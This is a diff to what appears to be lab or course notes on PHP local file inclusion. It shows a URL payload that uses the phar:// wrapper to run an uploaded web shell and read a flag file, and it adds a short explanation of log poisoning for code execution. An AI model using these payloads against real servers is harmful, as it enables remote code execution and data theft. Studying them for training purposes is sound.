@@ -276,3 +276,7 @@ _**Use any of the techniques covered in this section to gain RCE and read the fl
 ```
 http://83.136.255.43:42260/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt
 ```
+
+## Log Poisoning
+
+Here we are going to be writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code. for this to work the PHP web app must have read privileges over the logged files
